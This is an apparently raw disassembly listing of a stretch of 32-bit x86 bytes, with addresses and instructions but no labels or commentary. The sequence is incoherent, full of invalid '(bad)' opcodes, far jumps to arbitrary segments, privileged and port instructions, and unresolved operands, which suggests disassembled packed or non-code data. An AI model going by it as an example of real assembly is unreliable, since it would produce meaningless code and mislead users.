  41eaad:	or     bl,BYTE PTR ds:0x659bfabf
  41eab3:	lock rcr DWORD PTR [edx-0x7f],0xfe
  41eab8:	call   0x2ad4:0xf5ddcf14
  41eabf:	daa    
  41eac0:	xchg   edx,eax
  41eac1:	(bad)  
  41eac2:	cli    
  41eac3:	pop    edi
  41eac4:	nop
  41eac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac6:	addr16 pop edi
  41eac8:	cmp    ch,BYTE PTR [edi-0x3f]
  41eacb:	sub    al,0x63
  41eacd:	dec    eax
  41eace:	arpl   WORD PTR [edi-0x2a],si
  41ead1:	cli    
  41ead2:	mov    eax,0x4ac13690
  41ead7:	jmp    0xd891:0x6c1c9b07
  41eade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eadf:	xchg   ecx,eax
  41eae0:	test   al,0xd
  41eae2:	shl    esi,1
  41eae4:	mov    ebp,0xab0d2389
  41eae9:	retf   
  41eaea:	inc    ebp
  41eaeb:	push   ss
  41eaec:	or     DWORD PTR [edi],edi
  41eaee:	call   0x5e3:0x3ad67795
  41eaf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaf6:	jmp    0x41eb39
  41eaf8:	jecxz  0x41eb1a
  41eafa:	iret   
  41eafb:	aad    0x77
  41eafd:	mov    ah,BYTE PTR [eax+0x6b]
  41eb00:	push   edx
  41eb01:	fst    QWORD PTR [edx+0x2]
  41eb04:	mov    eax,ebp
  41eb06:	mov    ch,0x7a
  41eb08:	int    0xe7
  41eb0a:	and    DWORD PTR [edx],ecx
  41eb0c:	xor    ah,BYTE PTR [edi+eax*2+0x7925cde2]
  41eb13:	cmp    ebx,DWORD PTR [esi]
  41eb15:	jl     0x41eacd
  41eb17:	aad    0xf1
  41eb19:	jg     0x41eb73
  41eb1b:	xchg   esi,eax
  41eb1c:	cmp    eax,0x8a33765
  41eb21:	mov    esp,0xc86eeb70
  41eb26:	cwde   
  41eb27:	mov    eax,ds:0xcabf4842
  41eb2c:	push   ds
  41eb2d:	or     eax,0xe6273e37
  41eb32:	sub    DWORD PTR [ebx],edx
  41eb34:	xchg   edx,eax
  41eb35:	jle    0xf06f4539
  41eb3b:	(bad)  
  41eb3d:	dec    esi
  41eb3e:	sbb    ah,bl
  41eb40:	inc    esp
  41eb41:	ins    BYTE PTR es:[edi],dx
  41eb42:	in     al,0x33
  41eb44:	pop    edi
  41eb45:	mul    DWORD PTR [edx]
  41eb47:	vgf2p8affineinvqb ymm6,ymm0,YMMWORD PTR es:[edi-0x8f5f832],0xad
  41eb52:	push   es
  41eb53:	jae    0x41eb8d
  41eb55:	dec    ebp
  41eb56:	cld    
  41eb57:	fld    DWORD PTR ds:0xb79b1be6
  41eb5d:	out    0xef,al
  41eb5f:	dec    ecx
  41eb60:	fucomp st(6)
  41eb62:	pop    edi
  41eb63:	push   ebp
  41eb64:	scas   al,BYTE PTR es:[edi]
  41eb65:	xor    ecx,DWORD PTR [ebp+edx*4-0x57df4d13]
  41eb6c:	bndldx bnd3,[ebp+0x5aec1e60]
  41eb73:	cmp    al,0xe7
  41eb75:	stos   BYTE PTR es:[edi],al
  41eb76:	mov    BYTE PTR [eax-0x583842b2],bl
  41eb7c:	test   DWORD PTR [edi],0xe4bbc670
  41eb82:	dec    edi
  41eb83:	mov    edx,0x9fe715f7
  41eb88:	div    DWORD PTR [ebx-0x7]
  41eb8b:	popf   
  41eb8c:	and    al,al
  41eb8e:	aaa    
  41eb8f:	or     ebp,DWORD PTR [edx-0x3e]
  41eb92:	popf   
  41eb93:	aaa    
  41eb94:	add    ecx,DWORD PTR [eax]
  41eb96:	xchg   ebp,eax
  41eb97:	inc    ecx
  41eb98:	in     al,0xde
  41eb9a:	mov    bh,0xb5
  41eb9c:	das    
  41eb9d:	int    0xba
  41eb9f:	dec    eax
  41eba0:	(bad)  
  41eba1:	push   esp
  41eba2:	or     dh,BYTE PTR [esi+eax*8]
  41eba5:	stos   BYTE PTR es:[edi],al
  41eba6:	cmp    DWORD PTR [ebx-0x7fda301a],ecx
  41ebac:	and    eax,0x89c2a77b
  41ebb1:	and    ah,BYTE PTR [ebp-0x390e4a1b]
  41ebb7:	lock mov ecx,0xf4846728
  41ebbd:	ss dec ecx
  41ebbf:	pusha  
  41ebc0:	push   esp
  41ebc1:	dec    edx
  41ebc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc3:	cli    
  41ebc4:	mov    DWORD PTR [edx],esi
  41ebc6:	imul   ecx,edi,0x22
  41ebc9:	pop    ebx
  41ebca:	mov    ds:0x2b25b605,eax
  41ebcf:	pop    ebx
  41ebd0:	jge    0x41eb78
  41ebd2:	mov    ebx,0xb26c7ddb
  41ebd7:	dec    edi
  41ebd8:	dec    esi
  41ebd9:	mov    ebx,0xf80dcb3
  41ebde:	nop
  41ebdf:	inc    ebp
  41ebe0:	xchg   ebx,eax
  41ebe1:	mov    ah,0x23
  41ebe3:	dec    eax
  41ebe4:	cdq    
  41ebe5:	pop    esi
  41ebe6:	push   0x1e8b3e97
  41ebeb:	sbb    eax,esp
  41ebed:	outs   dx,BYTE PTR ds:[esi]
  41ebee:	(bad)
  41ebf2:	add    BYTE PTR [ebx],dh
  41ebf4:	rcr    BYTE PTR [eax+0x66900c56],cl
  41ebfa:	or     BYTE PTR [edx-0x2835064e],dl
  41ec00:	jb     0x41ec71
  41ec02:	es stos BYTE PTR es:[edi],al
  41ec04:	jecxz  0x41ebe7
  41ec06:	stc    
  41ec07:	repz sbb al,0x3c
  41ec0a:	add    esi,DWORD PTR [esi-0x3a3f72b8]
  41ec10:	outs   dx,DWORD PTR ds:[esi]
  41ec11:	push   cs
  41ec12:	or     al,0xc4
  41ec14:	popf   
  41ec15:	mov    WORD PTR [ebp+eiz*8-0x68],?
  41ec19:	mov    WORD PTR [ecx+0x244e6580],fs
  41ec1f:	test   ebp,edx
  41ec21:	mov    bh,0x93
  41ec23:	mov    al,0xd6
  41ec25:	mov    al,0x2e
  41ec27:	popf   
  41ec28:	jmp    0x39a8:0xeb1d050e
  41ec2f:	pushf  
  41ec30:	sub    dl,BYTE PTR [eax-0x6f579eb4]
  41ec36:	out    dx,eax
  41ec37:	popf   
  41ec38:	dec    eax
  41ec39:	pop    esi
  41ec3a:	sub    al,0xd9
  41ec3c:	xchg   BYTE PTR [edi+eiz*4],ah
  41ec3f:	mov    dl,0x84
  41ec41:	and    edi,esi
  41ec43:	and    DWORD PTR [eax],edx
  41ec45:	loop   0x41ec78
  41ec47:	cwde   
  41ec48:	and    ebp,ecx
  41ec4a:	sub    ebx,0x29ffff40
  41ec50:	push   edx
  41ec51:	sub    esi,ecx
  41ec53:	sub    ebx,ebx
  41ec55:	and    ch,BYTE PTR [ebx]
  41ec57:	or     eax,0x36dd3c96
  41ec5c:	jno    0x41ec02
  41ec5e:	cld    
  41ec5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec60:	inc    esp
  41ec61:	cmp    bl,dh
  41ec63:	aas    
  41ec64:	aaa    
  41ec65:	jo     0x41ecce
  41ec67:	push   cs
  41ec68:	stos   BYTE PTR es:[edi],al
  41ec69:	retf   
  41ec6a:	pop    ecx
  41ec6b:	adc    bl,dh
  41ec6d:	lock xlat BYTE PTR ds:[ebx]
  41ec6f:	mov    edx,0xc776f634
  41ec74:	fnstcw WORD PTR [ecx+0x14]
  41ec77:	and    al,0xa8
  41ec79:	fs pop es
  41ec7b:	stc    
  41ec7c:	out    dx,eax
  41ec7d:	fsubp  st(6),st
  41ec7f:	aad    0x64
  41ec81:	call   0xcddf:0xc6d2d69c
  41ec88:	jo     0x41ecb7
  41ec8a:	and    BYTE PTR [eax+edi*2],cl
  41ec8d:	xor    eax,0xe87f37e3
  41ec92:	xchg   edx,eax
  41ec93:	cmp    DWORD PTR [ebp+0xe165293],eax
  41ec99:	clc    
  41ec9a:	mov    al,0x58
  41ec9c:	pop    ss
  41ec9d:	in     eax,dx
  41ec9e:	mov    ds:0x9a76dd5f,eax
  41eca3:	addr16 dec esp
  41eca5:	sbb    DWORD PTR [ecx-0x2f893145],edx
  41ecab:	mov    ebp,0xf1d023ac
  41ecb0:	call   0x49b5:0xe5464cbc
  41ecb7:	pop    esp
  41ecb8:	add    al,0x76
  41ecba:	adc    eax,0xb0f2fd92
  41ecbf:	pop    edx
  41ecc0:	dec    edx
  41ecc1:	sbb    al,0xc4
  41ecc3:	sub    eax,0xdbf78999
  41ecc8:	daa    
  41ecc9:	in     eax,dx
  41ecca:	hlt    
  41eccb:	mov    ebp,0x1772e85a
  41ecd0:	retf   
  41ecd1:	push   0xa7f87190
  41ecd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecd7:	mov    edi,0xe0b1cf30
  41ecdc:	fnsave fs:[ecx]
  41ecdf:	cli    
  41ece0:	(bad)  
  41ece1:	or     eax,0x6127e4b
  41ece6:	shl    BYTE PTR ds:0x8b164f3c,cl
  41ecec:	mov    bl,0x11
  41ecee:	outs   dx,DWORD PTR ds:[esi]
  41ecef:	sub    ecx,DWORD PTR [esi+edx*1+0x41]
  41ecf3:	add    BYTE PTR [ebx+0x0],0xd5
  41ecf7:	call   FWORD PTR [edi-0x55]
  41ecfa:	xor    dl,ch
  41ecfc:	cmp    esp,ebx
  41ecfe:	loop   0x41ed6a
  41ed00:	or     ebx,eax
  41ed02:	fadd   DWORD PTR [edx]
  41ed04:	sub    BYTE PTR [ebp+0xb501398],bh
  41ed0a:	or     ecx,DWORD PTR [eax-0x71f82895]
  41ed10:	push   ss
  41ed11:	ror    DWORD PTR [ecx+0x5c],1
  41ed14:	jp     0x41ed81
  41ed16:	jp     0x41ed57
  41ed18:	in     eax,dx
  41ed19:	sar    edx,cl
  41ed1b:	adc    al,al
  41ed1d:	lods   eax,DWORD PTR ds:[esi]
  41ed1e:	jmp    0x41ecfd
  41ed20:	fs jb  0x41ed1a
  41ed23:	out    dx,eax
  41ed24:	repz test esp,eax
  41ed27:	push   edx
  41ed28:	aad    0x9e
  41ed2a:	out    dx,al
  41ed2b:	popa   
  41ed2c:	sbb    DWORD PTR [ecx-0x19],ebp
  41ed2f:	inc    ebx
  41ed30:	push   ds
  41ed31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed32:	mov    eax,0xd147ba2
  41ed37:	adc    DWORD PTR [edx],edi
  41ed39:	bound  edx,QWORD PTR [ebx]
  41ed3b:	fsubr  QWORD PTR [ebp-0x6]
  41ed3e:	inc    edx
  41ed3f:	xor    BYTE PTR [eax+0x264f6e88],bl
  41ed45:	or     BYTE PTR [esi+0x256e695e],0x66
  41ed4c:	dec    ecx
  41ed4d:	mov    eax,ds:0x54d76fc9
  41ed52:	sahf   
  41ed53:	ret    0x63d1
  41ed56:	mov    edx,0x521a5613
  41ed5b:	push   cs
  41ed5c:	mov    eax,ds:0x96fd2328
  41ed61:	xchg   esi,eax
  41ed62:	lods   al,BYTE PTR ds:[esi]
  41ed63:	sbb    esi,edi
  41ed65:	and    BYTE PTR [esi-0x6ac7bb3b],cl
  41ed6b:	pop    es
  41ed6c:	daa    
  41ed6d:	push   edx
  41ed6e:	jmp    0x95d4:0xaeed8ae3
  41ed75:	(bad)  
  41ed76:	mov    edx,0x351adeb8
  41ed7b:	fmulp  st(3),st
  41ed7d:	stc    
  41ed7e:	sbb    DWORD PTR [eax+esi*2+0x61b7c307],esp
  41ed85:	lea    esp,[eax]
  41ed87:	popf   
  41ed88:	arpl   bp,si
  41ed8a:	loopne 0x41edde
  41ed8c:	sbb    DWORD PTR [ebp-0x14991492],edi
  41ed92:	mov    ?,WORD PTR [ecx-0x261b2483]
  41ed98:	loop   0x41edf6
  41ed9a:	ja     0x41edc4
  41ed9c:	out    0x2d,eax
  41ed9e:	jbe    0x41ede7
  41eda0:	fild   WORD PTR [esi+0x53]
  41eda3:	shl    DWORD PTR [esi],1
  41eda5:	inc    ebp
  41eda6:	mov    dh,ah
  41eda8:	and    BYTE PTR [edi+ebx*4+0x7d30d4b9],dh
  41edaf:	push   esp
  41edb0:	cmc    
  41edb1:	retf   0xd70
  41edb4:	in     al,dx
  41edb5:	fimul  WORD PTR [eax-0x7570c102]
  41edbb:	fist   WORD PTR [edi]
  41edbd:	mov    dl,0x2b
  41edbf:	add    edi,esp
  41edc1:	cli    
  41edc2:	pop    ss
  41edc3:	mov    dl,0x84
  41edc5:	jb     0x41ee0f
  41edc7:	dec    esi
  41edc8:	hlt    
  41edc9:	xor    DWORD PTR [edx+0x780b10c6],0xe2eb062b
  41edd3:	adc    al,0x85
  41edd5:	jmp    0x9e52:0x6f55e99c
  41eddc:	jp     0x41ee28
  41edde:	das    
  41eddf:	sub    al,0xc
  41ede1:	xlat   BYTE PTR ds:[ebx]
  41ede2:	dec    ebp
  41ede3:	pop    ebx
  41ede4:	or     edx,edi
  41ede6:	out    dx,al
  41ede7:	clc    
  41ede8:	add    BYTE PTR [esi],bl
  41edea:	adc    DWORD PTR [edx+0x44],esi
  41eded:	(bad)  
  41edee:	pop    edi
  41edef:	pop    ecx
  41edf0:	ret    0xdc24
  41edf3:	and    al,0x7b
  41edf5:	scas   eax,DWORD PTR es:[edi]
  41edf6:	lods   al,BYTE PTR ds:[esi]
  41edf7:	int3   
  41edf8:	mov    ebx,0x435023ae
  41edfd:	jg     0x41edde
  41edff:	add    bl,BYTE PTR [ecx+0x58d38482]
  41ee05:	cwde   
  41ee06:	and    DWORD PTR [edx-0x1a88e0dc],ecx
  41ee0c:	lahf   
  41ee0d:	add    al,0xf4
  41ee0f:	(bad)  
  41ee10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee11:	mov    esp,?
  41ee13:	pop    es
  41ee14:	popf   
  41ee15:	in     al,dx
  41ee16:	or     cl,BYTE PTR [ecx+0x6f76f6c8]
  41ee1c:	mov    bh,0x41
  41ee1e:	inc    esp
  41ee1f:	popa   
  41ee20:	mov    esp,0xc6d7c3d0
  41ee25:	push   ebx
  41ee26:	jns    0x41ee51
  41ee28:	push   ebx
  41ee29:	mov    ?,edi
  41ee2b:	shl    BYTE PTR [edi+0x41],1
  41ee2e:	clc    
  41ee2f:	jg     0x41ee78
  41ee31:	ret    
  41ee32:	and    ch,al
  41ee34:	sub    al,0x90
  41ee36:	pop    esi
  41ee37:	call   0xabf6:0x91781234
  41ee3e:	dec    ebx
  41ee3f:	pop    ds
  41ee40:	jge    0x41ee87
  41ee42:	jns    0x41ee89
  41ee44:	sub    dh,al
  41ee46:	call   0x1c2aab94
  41ee4b:	adc    eax,0x1d948b8b
  41ee50:	mov    al,BYTE PTR [edx-0x16f8a308]
  41ee56:	mov    ds:0x1fa02994,al
  41ee5b:	dec    esi
  41ee5c:	sub    eax,0x7530b79a
  41ee61:	jbe    0x41ee08
  41ee63:	clc    
  41ee64:	pop    ds
  41ee65:	jno    0x41ee8d
  41ee67:	mov    edi,0x77263b38
  41ee6c:	sbb    ecx,DWORD PTR [ecx+0x40]
  41ee6f:	test   BYTE PTR [ebx],cl
  41ee71:	(bad)  
  41ee72:	js     0x41ee8c
  41ee74:	mov    eax,DWORD PTR ds:0x7b96cfdb
  41ee7a:	(bad)  
  41ee7b:	push   eax
  41ee7c:	sub    DWORD PTR [ebp+ecx*1-0x1b],edx
  41ee80:	in     eax,0x9d
  41ee82:	jp     0x41ef02
  41ee84:	popaw  
  41ee86:	fldcw  WORD PTR [ecx-0x4e]
  41ee89:	stos   DWORD PTR es:[edi],eax
  41ee8a:	dec    ebp
  41ee8b:	sar    DWORD PTR [ecx+0x3b],cl
  41ee8e:	imul   eax,DWORD PTR [ecx+0x41259e41],0xffffff98
  41ee95:	mov    cl,0x8d
  41ee97:	pop    ecx
  41ee98:	mov    esi,0x8cd322dd
  41ee9d:	dec    esp
  41ee9e:	sub    eax,0x77075312
  41eea3:	cld    
  41eea4:	ret    0x48f2
  41eea7:	pop    edx
  41eea8:	sbb    BYTE PTR [edx+0x7f],dh
  41eeab:	mov    edi,0xc93d05ef
  41eeb0:	js     0x41ee38
  41eeb2:	mov    es,WORD PTR [edi+0x5c]
  41eeb5:	mov    eax,ds:0xe315d9ab
  41eeba:	mov    cl,0xa5
  41eebc:	xchg   edx,eax
  41eebd:	dec    edi
  41eebe:	jle    0x41ef08
  41eec0:	xchg   ecx,eax
  41eec1:	cmc    
  41eec2:	cmp    ah,0xc2
  41eec5:	dec    ecx
  41eec6:	(bad)  
  41eec7:	sbb    al,0x4d
  41eec9:	mov    ?,esi
  41eecb:	cmp    DWORD PTR [ebp-0x2f],eax
  41eece:	shl    BYTE PTR [edx+0x2f],0x1d
  41eed2:	out    dx,eax
  41eed3:	add    edi,esi
  41eed5:	push   eax
  41eed6:	or     DWORD PTR [esi-0x3a26fb21],ecx
  41eedc:	xchg   esi,eax
  41eedd:	add    DWORD PTR [edi+0x7f],edi
  41eee0:	outs   dx,DWORD PTR ds:[esi]
  41eee1:	add    edi,DWORD PTR [ebx-0x14d72665]
  41eee7:	arpl   WORD PTR [edx+edx*4-0x6],ax
  41eeeb:	mov    edi,0x29cda59c
  41eef0:	cmp    BYTE PTR [ebp-0x5],cl
  41eef3:	jbe    0x41ef67
  41eef5:	inc    esi
  41eef6:	pop    esi
  41eef7:	mov    ebx,0x930167de
  41eefc:	scas   al,BYTE PTR es:[edi]
  41eefd:	sbb    ah,BYTE PTR [edx+0x32d8f8fe]
  41ef03:	std    
  41ef04:	(bad)  
  41ef05:	scas   al,BYTE PTR es:[edi]
  41ef06:	inc    edx
  41ef07:	out    0xad,eax
  41ef09:	hlt    
  41ef0a:	pop    ebx
  41ef0b:	inc    ebp
  41ef0c:	sub    al,0x88
  41ef0e:	mov    DWORD PTR [eax+ecx*4+0x62],ebp
  41ef12:	scas   al,BYTE PTR es:[edi]
  41ef13:	fucomip st,st(6)
  41ef15:	pushf  
  41ef16:	pop    ebx
  41ef17:	sub    eax,0xdaf7a8e1
  41ef1c:	and    ebp,DWORD PTR [edx-0x609d0935]
  41ef22:	les    esp,FWORD PTR [edx]
  41ef24:	shl    DWORD PTR [eax+0x2a],0x46
  41ef28:	sti    
  41ef29:	(bad)  
  41ef2a:	addr16 mov ebp,0xd2e383c6
  41ef30:	jno    0x41eeb6
  41ef32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef33:	mov    bh,0xed
  41ef35:	sub    BYTE PTR [ebp+0x36f4910b],0xa0
  41ef3c:	dec    ecx
  41ef3d:	in     al,0x45
  41ef3f:	xchg   edi,eax
  41ef40:	out    0x26,al
  41ef42:	(bad)  
  41ef43:	cmp    al,0x0
  41ef45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef46:	mov    bh,0x38
  41ef48:	repz push edx
  41ef4a:	jae    0x41ef9a
  41ef4c:	jae    0x41ef69
  41ef4e:	sbb    ch,al
  41ef50:	jno    0x41ef9f
  41ef52:	mov    ch,0xe
  41ef54:	jne    0x41ef3f
  41ef56:	jl     0x41ef4c
  41ef58:	xor    eax,0xfe7a8396
  41ef5d:	or     DWORD PTR [edx+0x3516e740],esi
  41ef63:	pop    esp
  41ef64:	xor    ecx,0x2a64fa3a
  41ef6a:	push   0xfca2a82a
  41ef6f:	xor    dl,BYTE PTR [edx+0x2b]
  41ef72:	je     0x41ef68
  41ef74:	jne    0x41ef39
  41ef76:	in     eax,dx
  41ef77:	inc    ebp
  41ef78:	popf   
  41ef79:	add    BYTE PTR [esi+ecx*4-0x5a39ab39],bl
  41ef80:	pop    edi
  41ef81:	mov    ds:0x13b74989,al
  41ef86:	or     ah,al
  41ef88:	cwde   
  41ef89:	cs in  al,0xab
  41ef8c:	mov    ebp,DWORD PTR [ecx]
  41ef8e:	mov    dh,0x10
  41ef90:	add    BYTE PTR [ebx+0x6a8aeec5],al
  41ef96:	daa    
  41ef97:	xor    BYTE PTR [ecx+0x23],ah
  41ef9a:	shr    bl,1
  41ef9c:	idiv   DWORD PTR [esi]
  41ef9e:	xor    eax,edi
  41efa0:	jp     0x41f014
  41efa2:	out    dx,eax
  41efa3:	ret    
  41efa4:	stos   BYTE PTR es:[edi],al
  41efa5:	push   ebx
  41efa6:	pop    ds
  41efa7:	jns    0x41efc7
  41efa9:	inc    eax
  41efaa:	ds push ds
  41efac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efae:	lods   al,BYTE PTR ds:[esi]
  41efaf:	inc    edx
  41efb0:	dec    esp
  41efb1:	ins    DWORD PTR es:[edi],dx
  41efb2:	inc    ecx
  41efb3:	xor    BYTE PTR [eax-0x37df6309],ch
  41efb9:	out    0x4b,eax
  41efbb:	ffreep st(3)
  41efbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efbf:	iret   
  41efc0:	cli    
  41efc1:	fld    QWORD PTR [ebp-0x2af906ff]
  41efc7:	jne    0x41ef9d
  41efc9:	or     al,0xc4
  41efcb:	fdiv   QWORD PTR [ebx]
  41efcd:	adc    eax,0xc4e9af20
  41efd2:	icebp  
  41efd3:	and    BYTE PTR [edi],0x6f
  41efd6:	imul   edx,edi,0x3981e766
  41efdc:	mov    ds:0x557170e5,al
  41efe1:	das    
  41efe2:	sub    al,0xe0
  41efe4:	add    BYTE PTR [ebp+eax*1-0x65c91e1e],al
  41efeb:	xchg   ecx,eax
  41efec:	and    edi,ebx
  41efee:	push   cs
  41efef:	or     DWORD PTR [ebp+0x7228e70d],ebx
  41eff5:	sbb    BYTE PTR [ebp-0xe81d238],dh
  41effb:	test   BYTE PTR [esi],bl
  41effd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41effe:	pusha  
  41efff:	cmp    BYTE PTR [edi],dl
  41f001:	int    0x13
  41f003:	pop    ss
  41f004:	jmp    0x89b6:0xb4f2d854
  41f00b:	daa    
  41f00c:	mov    ebp,DWORD PTR [eax]
  41f00e:	enter  0x82cc,0xf
  41f012:	sbb    eax,0x57b1a6bb
  41f017:	fsubr  st,st(0)
  41f019:	jmp    0xf13521cc
  41f01e:	test   al,0x83
  41f020:	enter  0xae94,0xa5
  41f024:	dec    ecx
  41f025:	or     eax,DWORD PTR [ebp+edi*8+0x3c]
  41f029:	adc    BYTE PTR [ecx-0x56],ah
  41f02c:	bnd es jmp 0x41efe1
  41f030:	lea    edx,[edi+0x58c16ec8]
  41f036:	stos   BYTE PTR es:[edi],al
  41f037:	xlat   BYTE PTR ds:[ebx]
  41f038:	(bad)  
  41f039:	mov    eax,DWORD PTR [ebp+0x2a8ad069]
  41f03f:	mov    edi,0x74e0beac
  41f044:	sub    BYTE PTR [edx+0x7112acec],0x50
  41f04b:	hlt    
  41f04c:	retf   
  41f04d:	out    dx,al
  41f04e:	fnstenv [edx+0x9]
  41f051:	out    0x37,eax
  41f053:	sbb    ch,BYTE PTR [eax+0x58]
  41f056:	mov    ds:0xd7337d,al
  41f05b:	iret   
  41f05c:	pop    edx
  41f05d:	dec    eax
  41f05e:	lds    ecx,FWORD PTR [ecx]
  41f060:	jb     0x41efe3
  41f062:	(bad)  
  41f063:	call   0x3dcb27cc
  41f068:	dec    eax
  41f069:	stos   BYTE PTR es:[edi],al
  41f06a:	or     ah,ch
  41f06c:	adc    eax,0xc018af73
  41f071:	push   esp
  41f072:	(bad)  
  41f074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f075:	mov    al,0x70
  41f077:	mov    al,ds:0x57a59f2d
  41f07c:	fwait
  41f07d:	pop    esi
  41f07e:	rcr    BYTE PTR [edx+0x2b],cl
  41f081:	push   edx
  41f082:	popa   
  41f083:	cwde   
  41f084:	scas   al,BYTE PTR es:[edi]
  41f085:	jmp    0xdfe1:0x385b71c8
  41f08c:	mov    dh,0xa9
  41f08e:	dec    esi
  41f08f:	icebp  
  41f090:	cmp    ch,bl
  41f092:	cmp    al,bl
  41f094:	add    esi,DWORD PTR [ebx+0x612c7e5]
  41f09a:	push   ecx
  41f09b:	into   
  41f09c:	inc    esi
  41f09d:	test   al,0xd8
  41f09f:	xor    eax,0x6543dac1
  41f0a4:	mov    esi,0xbb4eb866
  41f0a9:	and    esi,0xd
  41f0ac:	mov    gs,WORD PTR [edi+0x3d]
  41f0af:	sub    al,0xe0
  41f0b1:	les    edx,FWORD PTR [esi+0x50]
  41f0b4:	sub    al,BYTE PTR [esi]
  41f0b6:	pop    edi
  41f0b7:	cs cli 
  41f0b9:	stc    
  41f0ba:	inc    bp
  41f0bc:	adc    DWORD PTR [eax-0x1101db4f],esp
  41f0c2:	or     edi,DWORD PTR [edi-0x6a0f706e]
  41f0c8:	push   eax
  41f0c9:	rcr    cl,0x69
  41f0cc:	jecxz  0x41f07c
  41f0ce:	ret    
  41f0cf:	addr16 mov edi,0xb4ea24cb
  41f0d5:	sbb    esi,DWORD PTR [ebx]
  41f0d7:	cmp    ebp,ebx
  41f0d9:	mov    ebp,0x8595d70a
  41f0de:	lods   eax,DWORD PTR ds:[esi]
  41f0df:	push   esi
  41f0e0:	mov    esp,esp
  41f0e2:	jb     0x41f148
  41f0e4:	mov    ch,0x67
  41f0e6:	push   ds
  41f0e7:	idiv   DWORD PTR [ebp+0x177a059]
  41f0ed:	outs   dx,DWORD PTR ds:[esi]
  41f0ee:	jne    0x41f08a
  41f0f0:	lods   eax,DWORD PTR ds:[esi]
  41f0f1:	outs   dx,BYTE PTR ds:[esi]
  41f0f2:	stc    
  41f0f3:	jne    0x41f088
  41f0f5:	sub    eax,0x85c6b355
  41f0fa:	mov    esi,0xc0caa661
  41f0ff:	sub    ecx,DWORD PTR [esi]
  41f101:	imul   esi,DWORD PTR [eax-0x1e023e22],0x3f
  41f108:	add    BYTE PTR [ebp-0x34f48d68],bh
  41f10e:	jg     0x41f09c
  41f110:	inc    ecx
  41f111:	and    eax,0x40609127
  41f116:	stc    
  41f117:	jmp    0x73368d27
  41f11c:	add    DWORD PTR [edx+0x27],ecx
  41f11f:	jns    0x41f121
  41f121:	mov    DWORD PTR [esi-0xde62917],esp
  41f127:	jo     0x41f119
  41f129:	or     edx,DWORD PTR [edx-0x44eabad9]
  41f12f:	pushf  
  41f130:	sar    BYTE PTR [esi+0x0],0xfb
  41f134:	add    al,0xe4
  41f136:	popf   
  41f137:	sub    DWORD PTR [esi+0x7d98c29e],esi
  41f13d:	push   ss
  41f13e:	sbb    ch,BYTE PTR [eax-0x45201159]
  41f144:	loopne 0x41f1a8
  41f146:	mov    edx,0x79acaf32
  41f14b:	xor    BYTE PTR [edi+ecx*1+0x43],dh
  41f14f:	stc    
  41f150:	pop    ds
  41f151:	or     al,BYTE PTR [esi+0x329b234b]
  41f157:	shl    DWORD PTR [edi+ecx*8-0x7ca36f20],cl
  41f15e:	sar    DWORD PTR [eax],0xa1
  41f161:	cdq    
  41f162:	and    DWORD PTR [edx+0x7993a43f],edx
  41f168:	into   
  41f169:	ret    
  41f16a:	sbb    bl,BYTE PTR [ecx-0x26]
  41f16d:	push   ebp
  41f16e:	imul   ebx,DWORD PTR [esi+0x7e],0xffffff87
  41f172:	or     dh,dh
  41f174:	std    
  41f175:	gs mov bh,0xd5
  41f178:	out    0x31,al
  41f17a:	bound  eax,QWORD PTR [eax+0x12]
  41f17d:	lods   al,BYTE PTR ds:[esi]
  41f17e:	jmp    0x541e:0x21551a87
  41f185:	clc    
  41f186:	daa    
  41f187:	inc    ebp
  41f188:	fsubr  QWORD PTR [edi]
  41f18a:	ins    DWORD PTR es:[edi],dx
  41f18b:	and    ebx,DWORD PTR [ebx-0x6]
  41f18e:	pusha  
  41f18f:	sub    ah,BYTE PTR [esi]
  41f191:	cmp    eax,0x80169001
  41f196:	mov    bh,0x58
  41f198:	fimul  DWORD PTR [esi]
  41f19a:	cmp    eax,0x4f871f07
  41f19f:	iret   
  41f1a0:	arpl   si,ax
  41f1a2:	pop    edx
  41f1a3:	hlt    
  41f1a4:	dec    ecx
  41f1a5:	imul   BYTE PTR [ecx-0x43]
  41f1a8:	in     eax,0x5a
  41f1aa:	push   es
  41f1ab:	into   
  41f1ac:	xchg   esi,eax
  41f1ad:	iret   
  41f1ae:	sbb    BYTE PTR [edi-0xa],al
  41f1b1:	or     DWORD PTR [ebp-0x2ebd6b9c],0xffffffac
  41f1b8:	bound  eax,QWORD PTR [ecx-0x53]
  41f1bb:	add    BYTE PTR [edx],al
  41f1bd:	push   cs
  41f1be:	rcr    DWORD PTR [edi-0x44e98fb7],0x4a
  41f1c5:	repz dec eax
  41f1c7:	in     eax,dx
  41f1c8:	xor    eax,0xdf3d8b89
  41f1cd:	gs and al,0xdc
  41f1d0:	(bad)  
  41f1d1:	or     al,0x21
  41f1d3:	and    ecx,DWORD PTR [edi+0x26]
  41f1d6:	xor    eax,0x4673ffc0
  41f1db:	xchg   edx,eax
  41f1dc:	mov    bh,0xcf
  41f1de:	mov    dl,0x54
  41f1e0:	mov    eax,0xf0b96b12
  41f1e5:	inc    ebp
  41f1e6:	in     al,dx
  41f1e7:	cwde   
  41f1e8:	sbb    al,0xd5
  41f1ea:	mov    ecx,0x4e7ff9d9
  41f1ef:	push   es
  41f1f0:	mov    ds:0x514c94b8,eax
  41f1f5:	test   DWORD PTR [edi+0x114ff448],ebx
  41f1fb:	jbe    0x41f19e
  41f1fd:	mov    edi,0xdde29069
  41f202:	sub    ch,BYTE PTR [ecx-0x573619bf]
  41f208:	sbb    ebx,DWORD PTR [ebp-0x534473da]
  41f20e:	test   DWORD PTR [edx+0x26405d6],esi
  41f214:	pop    ebx
  41f215:	dec    ebx
  41f216:	iret   
  41f217:	test   BYTE PTR [edx-0xd],dl
  41f21a:	xchg   DWORD PTR [ebx],edi
